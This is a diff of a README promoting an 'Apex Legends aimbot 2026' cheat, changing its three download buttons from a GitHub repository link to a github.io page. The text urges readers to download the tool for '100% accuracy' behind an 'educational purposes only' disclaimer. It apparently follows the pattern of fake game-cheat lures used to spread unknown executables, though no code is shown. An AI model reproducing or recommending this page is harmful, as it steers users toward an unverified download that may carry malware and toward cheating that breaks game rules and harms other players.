@@ -1,6 +1,6 @@
 # 🎯 apex-legends-aimbot-2026 - Dominate Every Match Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Apex_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/Breaksealsocket8636/apex-legends-aimbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-Apex_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://breaksealsocket8636.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ This is a powerful external aimbot for Apex Legends (2026 season). It locks onto
 
 Visit this link to download the application:
 
-[![Download Apex Aimbot 2026](https://img.shields.io/badge/⬇️_Download-Apex_Aimbot_2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a&color=00FF00)](https://github.com/Breaksealsocket8636/apex-legends-aimbot-2026)
+[![Download Apex Aimbot 2026](https://img.shields.io/badge/⬇️_Download-Apex_Aimbot_2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a&color=00FF00)](https://breaksealsocket8636.github.io)
 
 ### 🛠️ Step-by-Step Guide
 
@@ -142,7 +142,7 @@ This software is for educational purposes only. Use at your own risk. The creato
 
 Stop missing shots. Stop losing fights. Download now and experience Apex Legends the way it's meant to be played — with 100% accuracy.
 
-[![Get It Now](https://img.shields.io/badge/🎯_Get_Apex_Aimbot_2026-Now!-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=000000&color=00FF00)](https://github.com/Breaksealsocket8636/apex-legends-aimbot-2026)
+[![Get It Now](https://img.shields.io/badge/🎯_Get_Apex_Aimbot_2026-Now!-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=000000&color=00FF00)](https://breaksealsocket8636.github.io)
 
 ---
 
